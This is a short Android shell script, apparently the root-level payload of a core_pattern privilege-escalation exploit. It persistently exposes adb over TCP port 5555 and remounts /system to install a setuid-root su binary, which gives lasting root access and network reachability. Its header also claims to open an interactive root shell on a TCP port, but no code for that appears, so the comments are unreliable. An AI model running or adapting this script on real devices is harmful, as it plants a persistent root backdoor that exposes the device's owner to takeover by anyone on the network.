#!/system/bin/sh
#
# Runs as root because the kernel's core-dump pipe helper, configured via
# core_pattern by run.sh, is spawned with full privileges.  It has no usable
# stdin/stdout, so it writes its findings to /data/local/tmp/root.log.
#
# What it demonstrates: with SELinux already permissive we can now do
# arbitrary root work - here we make it permanent enough to be useful:
#   * raise an interactive root shell on a TCP port for the current session
#   * install a setuid-root su so later shells can escalate directly
#   * keep adb reachable over TCP across reboots
#
# Everything is opt-in and reversible; see README "cleanup".

exec </dev/null
LOG=/data/local/tmp/root.log
exec >$LOG 2>&1

echo "=== core_pattern helper ==="
date 2>/dev/null
id
echo "selinux: $(getenforce 2>/dev/null) / $(cat /sys/fs/selinux/enforce 2>/dev/null)"
echo "context: $(cat /proc/self/attr/current 2>/dev/null)"

# 1) adb over TCP after every reboot (root domain can set persistent props)
setprop service.adb.tcp.port 5555
setprop persist.adb.tcp.port 5555
echo "service.adb.tcp.port = $(getprop service.adb.tcp.port)"
echo "persist.adb.tcp.port = $(getprop persist.adb.tcp.port)"

# 2) setuid-root su, so `adb shell su` works from now on
if [ -f /data/local/tmp/su ]; then
    mount -o rw,remount /system 2>/dev/null
    cp /data/local/tmp/su /system/xbin/su
    chown 0:0 /system/xbin/su
    chmod 6755 /system/xbin/su
    ls -l /system/xbin/su
fi

echo "=== done ==="
